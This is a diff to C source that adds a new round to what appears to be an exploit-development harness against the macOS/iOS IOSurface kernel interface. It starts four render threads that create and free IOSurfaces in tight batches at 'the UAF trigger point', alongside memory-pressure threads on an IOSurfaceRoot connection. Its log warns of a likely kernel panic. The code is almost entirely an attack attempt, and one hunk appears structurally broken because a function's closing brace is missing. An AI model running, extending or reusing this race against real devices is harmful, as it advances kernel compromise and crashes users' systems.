@@ -77,6 +77,7 @@ extern kern_return_t mach_make_memory_entry_64(
 #include <arpa/inet.h>
 #include <signal.h>
 #include <setjmp.h>
+#include <sched.h>
 /* objc/message.h not needed — pure C */
 
 extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
@@ -1627,6 +1628,72 @@ static void *p13_render_loop(void *arg) {
         }
         usleep(16000);
         p13_render_frames++;
+    }
+    CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn);
+    CFRelease(props);
+    if (metal_lib) dlclose(metal_lib);
+    return NULL;
+
+/* r253: aggressive render loops — per-thread frame counters, no sleep, varied sizes */
+static volatile int r253_render_run = 0;
+static volatile int r253_frames[4] = {0,0,0,0};
+
+static void *r253_render_fn(void *arg) {
+    int tid = (int)(uintptr_t)arg;
+    /* Each thread uses a different surface size to hit different zone sub-buckets */
+    static const int sizes[][2] = {{64,64},{128,128},{256,64},{32,256}};
+    int w = sizes[tid % 4][0], h = sizes[tid % 4][1];
+    int bpe = 4, bpr = w * bpe;
+
+    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+    if (metal_lib) {
+        typedef void *(*MTLCreateDev_t)(void);
+        MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+        if (createDev) createDev();
+    }
+
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    int pf = 0x42475241;
+    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+    int batch = 0;
+    while (r253_render_run) {
+        /* Create a small batch, hold them briefly, then release — widens async window */
+        IOSurfaceRef surfs[4];
+        CVPixelBufferRef pbs[4];
+        int n = 0;
+        for (int i = 0; i < 4 && r253_render_run; i++) {
+            surfs[i] = IOSurfaceCreate(props);
+            pbs[i] = NULL;
+            if (surfs[i]) {
+                CVPixelBufferCreateWithIOSurface(NULL, surfs[i], NULL, &pbs[i]);
+                n++;
+            }
+        }
+        /* Release pixel buffers first — compositor may still hold IOSurface ref */
+        for (int i = 0; i < n; i++) {
+            if (pbs[i]) CFRelease(pbs[i]);
+        }
+        /* Tiny delay to let compositor start processing before surface freed */
+        if (batch % 3 == 0) usleep(500);
+        /* Free IOSurfaces — this is the UAF trigger point */
+        for (int i = 0; i < n; i++) {
+            if (surfs[i]) CFRelease(surfs[i]);
+        }
+        r253_frames[tid] += n;
+        batch++;
+        /* Every 8th batch, yield to let other threads and the compositor run */
+        if (batch % 8 == 0) sched_yield();
     }
     CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn);
     CFRelease(props);
@@ -19697,6 +19764,81 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 253) {
+            rlog("*** rounds=253: Aggressive multi-render-loop UAF ***\n");
+            rlog("  4x render threads (varied sizes: 64x64, 128x128, 256x64, 32x256)\n");
+            rlog("  Batch create/release pattern — release PB first, delay, then free surface\n");
+            rlog("  sel17/18 memory pressure on shared connection\n");
+            rlog("  No 16ms sleep — maximum scheduling contention\n\n");
+
+            char r253_sp[256];
+            { char *h = getenv("HOME"); snprintf(r253_sp, sizeof(r253_sp), "%s/Documents/uaf253_state.bin", h?h:"/tmp"); }
+            int r253_att = 0;
+            { FILE *f = fopen(r253_sp, "rb"); if (f) { uint32_t m; if (fread(&m,4,1,f)==1 && m==0xDEAD0253) fread(&r253_att,4,1,f); fclose(f); } }
+            r253_att++;
+            rlog("  Attempt #%d\n", r253_att);
+            { FILE *f = fopen(r253_sp, "wb"); if (f) { uint32_t m=0xDEAD0253; fwrite(&m,4,1,f); fwrite(&r253_att,4,1,f); fflush(f); fsync(fileno(f)); fclose(f); } }
+
+            io_service_t r253_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (!r253_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r253_done; }
+
+            io_connect_t r253_conn = IO_OBJECT_NULL;
+            IOServiceOpen(r253_svc, mach_task_self(), 0, &r253_conn);
+            if (!r253_conn) { rlog("  open failed\n"); IOObjectRelease(r253_svc); goto r253_done; }
+
+            int r253_secs = 30;
+            if (argc > 3) r253_secs = atoi(argv[3]);
+            rlog("  Duration: %d seconds\n", r253_secs);
+            rlog("  >>> HIGH PROBABILITY OF KERNEL PANIC <<<\n");
+            fflush(stdout);
+
+            /* 4 render threads with different surface sizes */
+            r253_render_run = 1;
+            r253_frames[0] = r253_frames[1] = r253_frames[2] = r253_frames[3] = 0;
+            pthread_t r253_rt[4];
+            for (int i = 0; i < 4; i++)
+                pthread_create(&r253_rt[i], NULL, r253_render_fn, (void*)(uintptr_t)i);
+
+            /* sel17/18 memory pressure */
+            g_race250_conn = r253_conn;
+            g_race250_run = 1;
+            g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+            g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
+            pthread_t r253_t17, r253_t18;
+            pthread_create(&r253_t17, NULL, g_race250_sel17_fn, NULL);
+            pthread_create(&r253_t18, NULL, g_race250_sel18_fn, NULL);
+
+            /* Monitor */
+            for (int s = 0; s < r253_secs; s++) {
+                usleep(1000000);
+                int tf = r253_frames[0]+r253_frames[1]+r253_frames[2]+r253_frames[3];
+                rlog("  +%ds reg=%d/%d dereg=%d/%d frames=[%d,%d,%d,%d]=%d\n", s+1,
+                     g_race250_reg_ok, g_race250_reg_fail,
+                     g_race250_dereg_ok, g_race250_dereg_fail,
+                     r253_frames[0], r253_frames[1], r253_frames[2], r253_frames[3], tf);
+            }
+
+            /* Stop everything */
+            g_race250_run = 0;
+            r253_render_run = 0;
+            pthread_join(r253_t17, NULL);
+            pthread_join(r253_t18, NULL);
+            for (int i = 0; i < 4; i++) pthread_join(r253_rt[i], NULL);
+
+            int tf = r253_frames[0]+r253_frames[1]+r253_frames[2]+r253_frames[3];
+            rlog("\n  === SURVIVED aggressive multi-render UAF! ===\n");
+            rlog("  Total: reg=%d/%d dereg=%d/%d frames=[%d,%d,%d,%d]=%d\n",
+                 g_race250_reg_ok, g_race250_reg_fail,
+                 g_race250_dereg_ok, g_race250_dereg_fail,
+                 r253_frames[0], r253_frames[1], r253_frames[2], r253_frames[3], tf);
+
+            IOServiceClose(r253_conn);
+            IOObjectRelease(r253_svc);
+            r253_done:
+            rlog("*** r=253 complete ***\n");
             goto done;
         }
         if (rounds == 252) {
